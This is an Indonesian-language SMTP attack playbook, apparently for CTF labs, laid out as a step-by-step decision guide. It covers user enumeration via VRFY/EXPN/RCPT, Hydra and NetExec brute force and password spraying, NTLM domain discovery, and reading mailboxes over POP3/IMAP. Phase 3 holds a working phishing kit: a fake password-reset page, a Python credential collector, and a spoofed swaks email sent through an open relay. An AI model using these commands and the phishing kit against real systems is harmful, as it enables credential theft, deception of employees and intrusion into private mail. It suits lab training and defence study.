# 5. AUTHENTICATION BRUTE FORCE & SPRAYING
# ==========================================
# Port 25 (Standard Plaintext / STARTTLS):
hydra -l $USER -P /usr/share/wordlists/rockyou.txt $TARGET smtp -s 25 -t 4 -f -V

# Port 587 (Submission dengan STARTTLS):
hydra -l $USER -P /usr/share/wordlists/rockyou.txt -s 587 $TARGET smtp -t 4 -f -V

# Port 465 (SMTPS / Direct Implicit SSL):
hydra -l $USER -P /usr/share/wordlists/rockyou.txt -s 465 -S $TARGET smtp -t 4 -f -V

# Password Spraying SSH/SMB setelah dapat user SMTP:
nxc ssh $TARGET -u users_clean.txt -p 'Password123!' --continue-on-success
nxc smb $TARGET -u users_clean.txt -p 'Welcome2024!' --continue-on-success
```

---

# SMTP Complete Attack Workflow — Interactive Decision Guide

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun. Satu kali di awal sesi.
export TARGET="10.10.11.200"
export LHOST="10.10.14.5"        # IP tun0 kamu (VPN HTB/THM)
export LPORT="4444"
export DOMAIN="target.htb"
export MAIL_DOMAIN="mail.target.htb"
mkdir -p ~/smtp_loot/{users,creds,emails,loot}
cd ~/smtp_loot

echo "[*] Target: $TARGET | Domain: $DOMAIN | LHOST: $LHOST"
```

**Output yang diharapkan:**

text

```
[*] Target: 10.10.11.200 | Domain: target.htb | LHOST: 10.10.14.5
```

---

## ═══════════════════════════════════════

## FASE 0: KONFIRMASI PORT AKTIF & FINGERPRINT

## ═══════════════════════════════════════

### Langkah 0.1 — Fast Port Check (Konfirmasi SMTP aktif)

Bash

```
# Command 1: Cek semua port SMTP yang mungkin aktif
nmap -Pn -p 25,465,587 --open $TARGET

# Command 2: Kalau nmap lambat, coba netcat quick check
nc -zv -w 3 $TARGET 25
nc -zv -w 3 $TARGET 587
nc -zv -w 3 $TARGET 465
```

**OUTPUT BERHASIL ✅ — Port 25 terbuka:**

text

```
PORT    STATE SERVICE
25/tcp  open  smtp
587/tcp open  submission
```

➡️ Port aktif. Lanjut ke **Langkah 0.2**

**OUTPUT GAGAL ❌ — Semua port filtered/closed:**

text

```
25/tcp  filtered smtp
587/tcp filtered submission
465/tcp filtered smtps
```

➡️ **Kemungkinan:**

1. SMTP tidak diinstall di target ini — cek service lain
2. Firewall blokir — coba dengan `-Pn` flag:

Bash

```
nmap -Pn -sS -p 25,465,587 --source-port 53 $TARGET
```

➡️ Jika tetap filtered, SMTP tidak tersedia di target ini. Lanjut ke service lain sesuai nmap full scan.

---

### Langkah 0.2 — Banner Grabbing (KRITIS — Baca dengan Teliti!)

Bash

```
# Command 1: Raw banner via netcat (paling cepat)
nc -vn -w 5 $TARGET 25

# Command 2: Banner via nmap (lebih detail, ada versi software)
nmap -sV -p 25,465,587 --script smtp-commands,banner $TARGET -oN ~/smtp_loot/nmap_smtp.txt

# Command 3: Kalau port 25 tidak ada, coba 587
nc -vn -w 5 $TARGET 587
```

**OUTPUT BERHASIL ✅ — Linux Postfix:**

text

```
220 mail.inlanefreight.htb ESMTP Postfix (Ubuntu)
```

**Cara baca banner ini — PENTING, catat semua:**

|Field|Nilai Contoh|Arti & Tindakan|
|---|---|---|
|`mail.inlanefreight.htb`|FQDN Hostname|**Tambahkan ke `/etc/hosts` sekarang!**|
|`ESMTP`|Extended SMTP|Server mendukung AUTH, STARTTLS, dll|
|`Postfix`|MTA Software|Cari exploit Postfix di searchsploit|
|`(Ubuntu)`|OS|Linux target, kemungkinan ada SSH juga|

**OUTPUT BERHASIL ✅ — Windows Microsoft Exchange:**

text

```
220 EXCH01.corp.local Microsoft ESMTP MAIL Service ready at Mon, 15 Jan 2024
```

➡️ **KRITIS!** Ini adalah environment **Active Directory**:

- `EXCH01` = hostname Exchange server
- `corp.local` = domain AD
- Catat untuk pivot ke AD nanti → `<a href="/docs/ad-initial-enumeration" class="text-[#00b4d8] hover:underline font-mono font-semibold">35_ad_initial_enumeration_workflow.md</a>`

**OUTPUT BERHASIL ✅ — Linux Exim:**

text

```
220 mail.htb ESMTP Exim 4.89 Ubuntu Mon, 15 Jan 2024
```

➡️ **Versi Exim 4.89** → **LANGSUNG CEK CVE!** (ke Langkah 0.3 skip ke Fase 6)

**OUTPUT BERHASIL ✅ — Sendmail:**

text

```
220 mail.target.htb ESMTP Sendmail 8.15.2/8.15.2
```

➡️ Catat versi Sendmail, cek searchsploit setelah fingerprint selesai.

**OUTPUT GAGAL ❌ — Connection refused:**

text

```
nc: connect to 10.10.11.200 port 25 (tcp) failed: Connection refused
```

➡️ Port 25 benar-benar tidak berjalan. Coba 587:

Bash

```
nc -vn -w 5 $TARGET 587
# Atau cek apakah SMTP berjalan di port non-standard
nmap -Pn -p- --min-rate 5000 $TARGET | grep -E "smtp|25|587|465"
```

---

### Langkah 0.3 — Tambahkan ke /etc/hosts & Cek Kapabilitas

Bash

```
# WAJIB: Tambahkan hostname dari banner ke /etc/hosts
# Ganti 'mail.inlanefreight.htb inlanefreight.htb' dengan yang kamu dapat dari banner
echo "$TARGET mail.inlanefreight.htb inlanefreight.htb" | sudo tee -a /etc/hosts

# Cek semua kapabilitas perintah yang didukung server
nmap -p 25 --script smtp-commands $TARGET
```

**OUTPUT BERHASIL ✅ — Kapabilitas lengkap:**

text

```
PORT   STATE SERVICE
25/tcp open  smtp
| smtp-commands: mail.inlanefreight.htb, PIPELINING, SIZE 10240000, VRFY, ETRN, 
|                STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, AUTH LOGIN PLAIN
```

**Cara baca output ini — Tentukan strategi:**

|Keyword|Artinya|Tindakan|
|---|---|---|
|`VRFY` tercantum|User enumeration langsung bisa|→ Fase 2 Metode A|
|`AUTH LOGIN PLAIN`|Server butuh autentikasi|→ Fase 4 (Brute force)|
|`AUTH NTLM`|Windows/Exchange target|→ Fase 2 + NTLM Leak|
|`STARTTLS`|Bisa upgrade ke TLS|Gunakan `--starttls smtp` di tools|
|VRFY **tidak** ada|VRFY dinonaktifkan|→ Fase 2 Metode C (RCPT TO)|

**OUTPUT GAGAL ❌ — Script error:**

text

```
NSE: smtp-commands failed
```

➡️ Coba manual:

Bash

```
nc -vn $TARGET 25
# Ketik ini setelah connect:
EHLO test.com
# Lihat response, catat semua 250- lines
```

**Lanjut ke FASE 1.**

---

## ═══════════════════════════════════════

## FASE 1: OSINT PRE-ENUM (Sebelum Aktif Scan)

## ═══════════════════════════════════════

> **Tujuan:** Kumpulkan username kandidat dari sumber pasif SEBELUM menyentuh target. Lebih cepat, lebih stealth.

### Langkah 1.1 — OSINT Username Collection (Untuk CTF: Dari Deskripsi & Web)

Bash

```
# Untuk CTF: Cek web server yang mungkin bocorkan nama/email
curl -s http://$TARGET/ | grep -iE "(email|contact|team|staff|about)"
curl -s http://$TARGET/robots.txt
curl -s http://$TARGET/sitemap.xml

# Cek header HTTP untuk info server/domain
curl -s -I http://$TARGET | grep -iE "(server|x-powered|host)"

# Untuk Real Pentest: OSINT dari LinkedIn/website company
# Google dork: site:target.com "@target.com" filetype:pdf
# Google dork: site:linkedin.com "target company" employee
```

**OUTPUT BERHASIL ✅ — Ketemu email di web:**

HTML

```
<p>Contact us at: support@corp.htb | admin@corp.htb</p>
<p>Team: john.doe@corp.htb, jane.smith@corp.htb</p>
```

➡️ Ekstrak dan simpan:

Bash

```
# Ekstrak semua email dari web
curl -s http://$TARGET/ | grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' \
    | sort -u > ~/smtp_loot/users/osint_emails.txt

# Buat username list dari email
cat ~/smtp_loot/users/osint_emails.txt | cut -d'@' -f1 > ~/smtp_loot/users/osint_users.txt
cat ~/smtp_loot/users/osint_users.txt
```

**OUTPUT GAGAL ❌ — Tidak ada info di web:**

➡️ Lanjut langsung ke Fase 2 (Active Enumeration).

---

### Langkah 1.2 — Siapkan Wordlist Username

Bash

```
# Wordlist yang akan dipakai (urutan prioritas)
ls /usr/share/seclists/Usernames/
# 1. top-usernames-shortlist.txt    → Quick check, 100 user paling umum
# 2. xato-net-10-million-usernames.txt → Comprehensive
# 3. Names/names.txt                 → Untuk nama orang (CTF sering pakai)

# Generate wordlist dari nama yang ditemukan di OSINT
# Contoh: "John Doe" → generate variasi username
cat > ~/smtp_loot/users/name_variants.sh << 'SCRIPT'
#!/bin/bash
NAME="$1"  # misal: "john doe"
FIRST=$(echo $NAME | cut -d' ' -f1 | tr '[:upper:]' '[:lower:]')
LAST=$(echo $NAME | cut -d' ' -f2 | tr '[:upper:]' '[:lower:]')
echo "${FIRST}"              # john
echo "${LAST}"               # doe
echo "${FIRST}${LAST}"       # johndoe
echo "${FIRST}.${LAST}"      # john.doe
echo "${FIRST:0:1}${LAST}"   # jdoe
echo "${FIRST}${LAST:0:1}"   # johnd
echo "${LAST}${FIRST:0:1}"   # doej
echo "${LAST}.${FIRST}"      # doe.john
SCRIPT
chmod +x ~/smtp_loot/users/name_variants.sh

# Contoh penggunaan:
bash ~/smtp_loot/users/name_variants.sh "john doe" >> ~/smtp_loot/users/generated_users.txt
```

**Lanjut ke FASE 2.**

---

## ═══════════════════════════════════════

## FASE 2: USER ENUMERATION (3 METODE)

## ═══════════════════════════════════════

> **Tujuan:** Dapatkan daftar username valid dari server SMTP. Ini adalah INTI dari SMTP pentest.  
> **Urutan coba:** VRFY dulu → jika gagal coba EXPN → jika gagal coba RCPT TO.

### Langkah 2.1 — Metode A: VRFY (Paling Cepat)

Bash

```
# Test manual dulu — apakah VRFY diizinkan?
nc -vn $TARGET 25
```

Di dalam prompt netcat, ketik:

text

```
HELO attacker.com
VRFY root
VRFY admin
VRFY test123fake
QUIT
```

**OUTPUT BERHASIL ✅ — VRFY bekerja, user valid:**

text

```
220 mail.inlanefreight.htb ESMTP Postfix
250 mail.inlanefreight.htb
VRFY root
250 2.1.5 root@inlanefreight.htb          ← USER VALID!
VRFY admin
250 2.1.5 admin@inlanefreight.htb         ← USER VALID!
VRFY test123fake
550 5.1.1 <test123fake>: User unknown     ← USER TIDAK ADA
```

➡️ VRFY bekerja! Jalankan automasi:

Bash

```
# Automasi VRFY dengan wordlist
smtp-user-enum -M VRFY \
    -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
    -t $TARGET \
    | tee ~/smtp_loot/users/vrfy_results.txt

# Jika punya wordlist dari OSINT, gabungkan
cat ~/smtp_loot/users/osint_users.txt >> /tmp/combined_users.txt
cat /usr/share/seclists/Usernames/top-usernames-shortlist.txt >> /tmp/combined_users.txt
sort -u /tmp/combined_users.txt > /tmp/final_users.txt

smtp-user-enum -M VRFY -U /tmp/final_users.txt -t $TARGET \
    | tee ~/smtp_loot/users/vrfy_full_results.txt
```

**OUTPUT BERHASIL ✅ — smtp-user-enum VRFY:**

text

```
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... /usr/share/seclists/Usernames/top-usernames-shortlist.txt
Target count ............. 1
Username count ........... 100
Target TCP port .......... 25
Query timeout ............ 5 secs

[+] 10.10.11.200: root exists
[+] 10.10.11.200: admin exists
[+] 10.10.11.200: mail exists
3 results.
```

➡️ Simpan hasil:

Bash

```
grep "\[+\]" ~/smtp_loot/users/vrfy_full_results.txt \
    | awk '{print $NF}' \
    | tr -d '<>' \
    | cut -d'@' -f1 \
    | sort -u > ~/smtp_loot/users/valid_users.txt

echo "[*] Valid users found: $(wc -l < ~/smtp_loot/users/valid_users.txt)"
cat ~/smtp_loot/users/valid_users.txt
```

➡️ Lanjut ke **Fase 3** (Open Relay Check) dan **Fase 4** (Password Attack).

**OUTPUT GAGAL ❌ — VRFY dinonaktifkan:**

text

```
VRFY root
502 5.5.2 Error: command not implemented
```

➡️ Coba Metode B (EXPN):

---

### Langkah 2.2 — Metode B: EXPN (Mailing List Expand)

Bash

```
# Test manual
nc -vn $TARGET 25
```

Di dalam prompt:

text

```
HELO attacker.com
EXPN root
EXPN admin
EXPN support
QUIT
```

**OUTPUT BERHASIL ✅ — EXPN bekerja:**

text

```
EXPN root
250 2.1.5 root@inlanefreight.htb
EXPN support
250 2.1.5 <john.doe@inlanefreight.htb>, <jane.smith@inlanefreight.htb>
```

➡️ JACKPOT! EXPN bisa membocorkan multiple email dari mailing list:

Bash

```
# Automasi EXPN
smtp-user-enum -M EXPN \
    -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
    -t $TARGET \
    | tee ~/smtp_loot/users/expn_results.txt

grep "\[+\]" ~/smtp_loot/users/expn_results.txt \
    | awk '{print $NF}' \
    | tr -d '<>' \
    | cut -d'@' -f1 \
    | sort -u >> ~/smtp_loot/users/valid_users.txt
```

**OUTPUT GAGAL ❌ — EXPN juga dinonaktifkan:**

text

```
EXPN root
502 5.5.2 Error: command not implemented
```

➡️ Lanjut ke Metode C — yang hampir **selalu berhasil**.

---

### Langkah 2.3 — Metode C: RCPT TO (Paling Andal — Pakai Ini Jika A & B Gagal)

> Metode ini menggunakan alur pengiriman email normal, jadi sangat sulit diblokir sysadmin tanpa merusak fungsi email itu sendiri.

Bash

```
# Test manual dulu
nc -vn $TARGET 25
```

Di dalam prompt, ketik **berurutan** (urutan ini WAJIB diikuti):

text

```
HELO attacker.com
MAIL FROM:<test@attacker.com>
RCPT TO:<root@inlanefreight.htb>
RCPT TO:<jordan@inlanefreight.htb>
RCPT TO:<fakeuser123@inlanefreight.htb>
RSET
QUIT
```

**OUTPUT BERHASIL ✅ — User valid vs invalid:**

text

```
HELO attacker.com
250 mail.inlanefreight.htb
MAIL FROM:<test@attacker.com>
250 2.1.0 Ok
RCPT TO:<root@inlanefreight.htb>
250 2.1.5 Ok                                     ← ROOT ADA!
RCPT TO:<jordan@inlanefreight.htb>
250 2.1.5 Ok                                     ← JORDAN ADA!
RCPT TO:<fakeuser123@inlanefreight.htb>
550 5.1.1 <fakeuser123@inlanefreight.htb>: User unknown in virtual mailbox table
RSET
250 2.0.0 Ok
QUIT
221 2.0.0 Bye
```

**PERHATIAN — Error 503 Bad Sequence:**

Jika kamu dapat:

text

```
503 5.5.1 Error: need RCPT command
```

➡️ Artinya kamu skip langkah. WAJIB urutan: `HELO` → `MAIL FROM` → `RCPT TO`.

Bash

```
# Automasi RCPT TO — ini yang paling powerful
smtp-user-enum -M RCPT \
    -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
    -D $DOMAIN \
    -t $TARGET \
    | tee ~/smtp_loot/users/rcpt_results.txt

# Ekstrak user valid
grep "\[+\]" ~/smtp_loot/users/rcpt_results.txt \
    | awk '{print $NF}' \
    | tr -d '<>' \
    | cut -d'@' -f1 \
    | sort -u >> ~/smtp_loot/users/valid_users.txt

# Hapus duplikat
sort -u ~/smtp_loot/users/valid_users.txt -o ~/smtp_loot/users/valid_users.txt

echo "[*] Total valid users: $(wc -l < ~/smtp_loot/users/valid_users.txt)"
cat ~/smtp_loot/users/valid_users.txt
```

**OUTPUT BERHASIL ✅ — User list berhasil dikumpulkan:**

text

```
[+] 10.10.11.200: root@target.htb exists
[+] 10.10.11.200: admin@target.htb exists
[+] 10.10.11.200: jordan@target.htb exists
[+] 10.10.11.200: support@target.htb exists

[*] Total valid users: 4
```

**OUTPUT GAGAL ❌ — Rate limiting:**

text

```
421 4.7.0 Connection rate limit exceeded
```

➡️ Server membatasi koneksi. Tambahkan delay:

Bash

```
# Kurangi kecepatan dengan -m (max proses) dan tambah timeout
smtp-user-enum -M RCPT -U /tmp/final_users.txt -D $DOMAIN -t $TARGET -m 1
```

➡️ Jika masih gagal, lakukan manual dengan jeda:

Bash

```
# Script dengan delay antar request
while read user; do
    result=$(nc -w 3 $TARGET 25 << EOF
HELO attacker.com
MAIL FROM:<test@attacker.com>
RCPT TO:<${user}@${DOMAIN}>
RSET
QUIT
EOF
)
    if echo "$result" | grep -q "250 2.1.5"; then
        echo "[+] VALID: $user"
        echo "$user" >> ~/smtp_loot/users/valid_users.txt
    fi
    sleep 2  # Delay 2 detik antar request
done < /tmp/final_users.txt
```

**OUTPUT GAGAL ❌ — Semua user di-reject dengan 550:**

text

```
550 5.7.1 Relay access denied
```

➡️ Server dikonfigurasi hanya terima email untuk domain internal. Coba ganti format:

Bash

```
# Coba tanpa domain (hanya username)
smtp-user-enum -M RCPT -U /tmp/final_users.txt -t $TARGET

# Coba dengan domain yang berbeda (dari banner)
smtp-user-enum -M RCPT -U /tmp/final_users.txt -D "corp.local" -t $TARGET
```

---

### Langkah 2.4 — Nmap Automated Enumeration (Alternatif)

Bash

```
# Nmap punya script bawaan untuk SMTP enum
nmap -p 25 --script smtp-enum-users \
    --script-args="smtp-enum-users.methods={VRFY,RCPT,EXPN}" \
    $TARGET
```

**OUTPUT BERHASIL ✅:**

text

```
PORT   STATE SERVICE
25/tcp open  smtp
| smtp-enum-users:
|   root
|   admin
|_  www-data
```

---

## ═══════════════════════════════════════

## FASE 3: OPEN RELAY AUDIT & EXPLOITATION

## ═══════════════════════════════════════

> **Tujuan:** Cek apakah server bisa dipakai untuk kirim email ke domain eksternal tanpa autentikasi. Open Relay = bisa phishing internal.

### Langkah 3.1 — Deteksi Open Relay

Bash

```
# Command 1: Nmap automated check (paling mudah)
nmap -p 25 --script smtp-open-relay $TARGET

# Command 2: Manual check via netcat
nc -vn $TARGET 25
```

Di dalam prompt netcat untuk manual check:

text

```
HELO attacker.com
MAIL FROM:<fake@external.com>
RCPT TO:<victim@another-external.com>
DATA
Subject: Open Relay Test
This is a relay test.
.
QUIT
```

**OUTPUT BERHASIL ✅ — Nmap: Server IS open relay:**

text

```
PORT   STATE SERVICE
25/tcp open  smtp
| smtp-open-relay: Server is an open relay (16/16 tests allowed)
|   MAIL FROM:<antispam@test.example.com> -> RCPT TO:<antispam@test.example.com> [ALLOWED]
|   MAIL FROM:<antispam@test.example.com> -> RCPT TO:<relaytest@test.example.com> [ALLOWED]
```

➡️ **Open Relay terkonfirmasi!** Sekarang kita bisa kirim email phishing mengatasnamakan siapapun:

Bash

```
# Exploit Open Relay untuk internal phishing
# SCENARIO: Kita ingin phishing user internal untuk dapat creds

# Step 1: Setup HTTP server untuk capture request (phishing page)
mkdir -p /tmp/phish
cat > /tmp/phish/index.html << 'EOF'
<html><body>
<h2>Corporate Portal - Password Reset Required</h2>
<form method="POST" action="/collect">
Username: <input name="user"><br>
Password: <input name="pass" type="password"><br>
<input type="submit" value="Login">
</form>
</body></html>
EOF

# Setup simple HTTP collector
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        data = urllib.parse.parse_qs(self.rfile.read(length).decode())
        print(f'[CREDS CAPTURED] {data}')
        with open('/tmp/phish/creds.txt', 'a') as f:
            f.write(str(data) + '\n')
        self.send_response(200)
        self.end_headers()
    def log_message(self, *args): pass

HTTPServer(('0.0.0.0', 80), Handler).serve_forever()
" &

echo "[*] Phishing server running on port 80"

# Step 2: Kirim email phishing via Open Relay
swaks \
    --to "karyawan@$DOMAIN" \
    --from "it-support@$DOMAIN" \
    --server $TARGET \
    --header "Subject: URGENT: Mandatory Password Reset - Action Required" \
    --body "Dear Employee,

Our security team has detected unusual activity on your account.
Please reset your password immediately:

http://$LHOST/index.html

IT Security Team"

echo "[*] Phishing email sent! Monitor /tmp/phish/creds.txt"
```

**OUTPUT BERHASIL ✅ — Email terkirim via swaks:**

text

```
=== Trying 10.10.11.200:25...
=== Connected to 10.10.11.200.
<-  220 mail.corp.htb ESMTP Postfix (Ubuntu)
 -> EHLO kali
<-  250-mail.corp.htb
<-  250 DSN
 -> MAIL FROM:<it-support@corp.htb>
<-  250 2.1.0 Ok
 -> RCPT TO:<karyawan@corp.htb>
<-  250 2.1.5 Ok           ← EMAIL DITERIMA TANPA AUTH!
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> .
<-  250 2.0.0 Ok: queued as ABC123
 -> QUIT
<-  221 2.0.0 Bye
```

**OUTPUT GAGAL ❌ — Nmap: NOT an open relay:**

text

```
| smtp-open-relay: Server is NOT an open relay (0/16 tests)
```

➡️ Server dikonfigurasi dengan benar. Tidak bisa dipakai untuk phishing. Lanjut ke **Fase 4**.

---

## ═══════════════════════════════════════

## FASE 4: SMTP AUTHENTICATION TESTING & BRUTE FORCE

## ═══════════════════════════════════════

> **Tujuan:** Jika SMTP butuh autentikasi, coba crack passwordnya.

### Langkah 4.1 — Cek Metode Autentikasi yang Didukung

Bash

```
# Cek via netcat
nc -vn $TARGET 25
```

Ketik setelah connect:

text

```
EHLO test.com
```

**OUTPUT BERHASIL ✅ — Ada AUTH:**

text

```
250-mail.corp.htb
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-AUTH LOGIN PLAIN NTLM    ← CATAT INI!
250-ENHANCEDSTATUSCODES
250 DSN
```

**Interpretasi AUTH methods:**

|Auth Method|Artinya|Implikasi|
|---|---|---|
|`AUTH PLAIN`|Password dikirim plaintext (base64)|Mudah di-intercept|
|`AUTH LOGIN`|Interaktif, user+pass dikirim terpisah|Bisa brute force|
|`AUTH NTLM`|Windows NTLM authentication|Bisa leak domain info!|
|`AUTH CRAM-MD5`|Challenge-response|Lebih aman, tapi masih bisa crack|

**OUTPUT — AUTH NTLM tersedia (khusus Exchange):**

➡️ NTLM bisa membocorkan nama domain! Ke **Langkah 4.2**

Bash

```
# Cek port 587 juga (submission port)
nc -vn $TARGET 587
# Ketik: EHLO test.com
# Cek apakah ada STARTTLS
```

---

### Langkah 4.2 — NTLM Domain Discovery (Khusus Exchange)

Bash

```
# Method 1: NetExec otomatis
nxc smtp $TARGET -p 25

# Method 2: Manual via telnet
telnet $TARGET 25
```

Di dalam telnet:

text

```
EHLO attacker.com
AUTH NTLM
TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAFAs4OAAAADw==
```

**OUTPUT BERHASIL ✅ — NTLM Challenge dikembalikan:**

text

```
334 TlRMTVNTUAACAAAADAAMADgAAAAFgoqi...BASE64DATA...
```

➡️ Decode untuk dapatkan domain info:

Bash

```
# Decode NTLM challenge untuk ekstrak domain name
# Ganti BASE64DATA dengan string yang kamu dapat
python3 << 'EOF'
import base64, struct

raw_b64 = "TlRMTVNTUAACAAAADAAMADgAAAAFgoqi..."  # GANTI INI
try:
    data = base64.b64decode(raw_b64 + "==")
    nb_len = struct.unpack('<H', data[12:14])[0]
    nb_off = struct.unpack('<I', data[16:20])[0]
    print(f"[+] NetBIOS Domain: {data[nb_off:nb_off+nb_len].decode('utf-16-le')}")
    
    # Try to get server hostname too
    if len(data) > 56:
        dn_len = struct.unpack('<H', data[40:42])[0]
        dn_off = struct.unpack('<I', data[44:48])[0]
        print(f"[+] DNS Domain: {data[dn_off:dn_off+dn_len].decode('utf-16-le')}")
except Exception as e:
    print(f"[-] Decode error: {e}")
    print("[*] Try manual: echo 'BASE64' | base64 -d | strings")
EOF
```

**OUTPUT BERHASIL ✅ — Domain info terbongkar:**

text

```
[+] NetBIOS Domain: CORP
[+] DNS Domain: corp.local
```

➡️ Catat domain info ini → berguna untuk AD attacks nanti.

---

### Langkah 4.3 — Brute Force Autentikasi SMTP

Bash

```
# PASTIKAN dulu punya user list dari Fase 2
cat ~/smtp_loot/users/valid_users.txt

# Method 1: Hydra - Port 25 Plaintext
hydra -L ~/smtp_loot/users/valid_users.txt \
    -P /usr/share/wordlists/rockyou.txt \
    $TARGET smtp -s 25 -t 4 -f -V \
    | tee ~/smtp_loot/creds/hydra_smtp25.txt

# Method 2: Hydra - Port 587 dengan STARTTLS
hydra -L ~/smtp_loot/users/valid_users.txt \
    -P /usr/share/wordlists/rockyou.txt \
    -s 587 $TARGET smtp -t 4 -f -V \
    | tee ~/smtp_loot/creds/hydra_smtp587.txt

# Method 3: Hydra - Port 465 SMTPS (SSL)
hydra -L ~/smtp_loot/users/valid_users.txt \
    -P /usr/share/wordlists/rockyou.txt \
    -s 465 -S $TARGET smtp -t 4 -f -V \
    | tee ~/smtp_loot/creds/hydra_smtp465.txt

# Method 4: NetExec (lebih cepat, lebih modern)
nxc smtp $TARGET -u ~/smtp_loot/users/valid_users.txt \
    -p /usr/share/wordlists/rockyou.txt \
    --continue-on-success \
    | tee ~/smtp_loot/creds/nxc_smtp.txt

# Filter yang berhasil
grep "\[+\]" ~/smtp_loot/creds/nxc_smtp.txt
```

**OUTPUT BERHASIL ✅ — Credentials ditemukan:**

text

```
[25][smtp] host: 10.10.11.200   login: admin   password: Password123!
```

ATAU dengan NetExec:

text

```
SMTP  10.10.11.200  25  [+] admin:Password123!
```

➡️ Simpan credentials:

Bash

```
export SMTP_USER="admin"
export SMTP_PASS="Password123!"
echo "$SMTP_USER:$SMTP_PASS" >> ~/smtp_loot/creds/found_creds.txt

# Test credentials yang ditemukan
swaks --to "test@$DOMAIN" --from "$SMTP_USER@$DOMAIN" \
    --server $TARGET \
    --auth LOGIN \
    --auth-user "$SMTP_USER" \
    --auth-password "$SMTP_PASS" \
    --quit-after AUTH
```

**OUTPUT BERHASIL ✅ — Auth berhasil dengan swaks:**

text

```
<-  235 2.7.0 Authentication successful    ← VALID CREDS!
```

**OUTPUT GAGAL ❌ — 535 Authentication failed:**

text

```
535 5.7.8 Error: authentication failed: authentication failure
```

➡️ Password salah. Coba wordlist yang lebih targeted:

Bash

```
# Buat password list yang lebih relevan
cat > ~/smtp_loot/creds/targeted_passwords.txt << 'EOF'
Password123!
Password1!
Welcome1!
Welcome2024!
Summer2024!
Admin@123
P@ssw0rd
Letmein123!
EOF

# Tambahkan domain name sebagai kandidat
echo "$(echo $DOMAIN | cut -d'.' -f1)2024!" >> ~/smtp_loot/creds/targeted_passwords.txt
echo "$(echo $DOMAIN | cut -d'.' -f1)@123" >> ~/smtp_loot/creds/targeted_passwords.txt

hydra -L ~/smtp_loot/users/valid_users.txt \
    -P ~/smtp_loot/creds/targeted_passwords.txt \
    $TARGET smtp -s 25 -t 4 -f -V
```

**OUTPUT GAGAL ❌ — 454 TLS not available:**

text

```
454 4.7.0 TLS not available due to local problem
```

➡️ Server ada masalah TLS tapi koneksi plain masih bisa:

Bash

```
# Paksa tanpa TLS
swaks --to "admin@$DOMAIN" --server $TARGET \
    --auth LOGIN --auth-user "admin" --auth-password "Password123!" \
    --no-tls
```

---

## ═══════════════════════════════════════

## FASE 5: INFORMATION GATHERING & MAILBOX ACCESS

## ═══════════════════════════════════════

> **Tujuan:** Jika dapat valid creds SMTP, coba akses mailbox via POP3/IMAP untuk membaca email internal.

### Langkah 5.1 — Cek POP3/IMAP (Baca Email Internal)

Bash

```
# Cek apakah ada POP3/IMAP yang berjalan
nmap -Pn -p 110,143,993,995 $TARGET

# Jika ada, coba login dengan creds yang sudah kita dapat
# POP3 (port 110)
nc -vn $TARGET 110
```

Di dalam prompt POP3:

text

```
USER admin
PASS Password123!
LIST
RETR 1
QUIT
```

**OUTPUT BERHASIL ✅ — POP3 login berhasil:**

text

```
+OK Dovecot ready.
USER admin
+OK
PASS Password123!
+OK Logged in.
LIST
+OK 3 messages:
1 1847
2 2359
3 891
RETR 1
+OK 1847 octets follow.
Return-Path: <ceo@corp.htb>
Subject: Q4 Budget Review - CONFIDENTIAL
...content email...
```

➡️ **Baca semua email!** Cari password, attachment, informasi sensitif:

Bash

```
# Automated POP3 download menggunakan curl
# Download semua email
for i in $(seq 1 10); do
    curl -s -u "$SMTP_USER:$SMTP_PASS" "pop3://$TARGET/$i" \
        >> ~/smtp_loot/emails/all_emails.txt 2>/dev/null
    echo "---EMAIL $i END---" >> ~/smtp_loot/emails/all_emails.txt
done

# Analisis email untuk credentials
grep -iE "(password|passwd|secret|credential|token|key)" \
    ~/smtp_loot/emails/all_emails.txt | head -30

# Cari attachment/link
grep -iE "(http://|https://|attachment|.pdf|.zip)" \
    ~/smtp_loot/emails/all_emails.txt | head -20
```

**OUTPUT BERHASIL ✅ — Ketemu password di email:**

text

```
Subject: System Credentials - INTERNAL ONLY
From: sysadmin@corp.htb

Hi team,
New server credentials:
Username: svc_deploy
Password: Deploy@2024!
Server: 10.10.11.200

Please delete this email after reading.
```

➡️ **SIMPAN CREDENTIALS:**

Bash

```
echo "svc_deploy:Deploy@2024!" >> ~/smtp_loot/creds/found_creds.txt
export USER="svc_deploy"
export PASS="Deploy@2024!"
```

➡️ **Langsung test ke service lain! Ke Fase 7 (Cross-Service Testing)**

Bash

```
# IMAP (port 143) - Lebih powerful dari POP3, bisa browse folder
nc -vn $TARGET 143
```

Di dalam prompt IMAP:

text

```
a1 LOGIN admin Password123!
a2 LIST "" "*"
a3 SELECT INBOX
a4 FETCH 1 BODY[]
a5 LOGOUT
```

**OUTPUT BERHASIL ✅ — IMAP login:**

text

```
* OK Dovecot ready.
a1 LOGIN admin Password123!
a1 OK Logged in.
a2 LIST "" "*"
* LIST (\HasNoChildren) "." INBOX
* LIST (\HasNoChildren) "." Sent
* LIST (\HasNoChildren) "." Drafts    ← CEK DRAFTS! Sering ada creds tersimpan
a2 OK List completed.
```

➡️ Cek semua folder, terutama **Drafts** dan **Sent**:

Bash

```
# Fetch dari Drafts
# a3 SELECT Drafts
# a4 FETCH 1:* BODY[]

# Automated via curl
curl -s --url "imap://$TARGET/INBOX" -u "$SMTP_USER:$SMTP_PASS" \
    --request "FETCH 1:* BODY[TEXT]" >> ~/smtp_loot/emails/imap_inbox.txt

